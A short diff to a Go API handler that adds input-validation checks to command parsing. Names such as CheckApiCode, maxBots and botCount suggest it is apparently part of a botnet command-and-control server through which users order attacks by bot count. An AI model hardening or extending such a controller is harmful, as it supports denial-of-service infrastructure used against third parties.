@@ -28,14 +28,26 @@ func (this *Api) Handle() {
         return
     }
     passwordSplit := strings.SplitN(cmd, "|", 2)
+    if len(passwordSplit) < 2 {
+        this.conn.Write([]byte("ERR|Invalid command format\r\n"))
+        return
+    }
     if apiKeyValid, userInfo = database.CheckApiCode(passwordSplit[0]); !apiKeyValid {
         this.conn.Write([]byte("ERR|API code invalid\r\n"))
         return
     }
     botCount = userInfo.maxBots
     cmd = passwordSplit[1]
+    if len(cmd) == 0 {
+        this.conn.Write([]byte("ERR|Empty command\r\n"))
+        return
+    }
     if cmd[0] == '-' {
         countSplit := strings.SplitN(cmd, " ", 2)
+        if len(countSplit) < 2 {
+            this.conn.Write([]byte("ERR|Invalid count format\r\n"))
+            return
+        }
         count := countSplit[0][1:]
         botCount, err = strconv.Atoi(count)
         if err != nil {
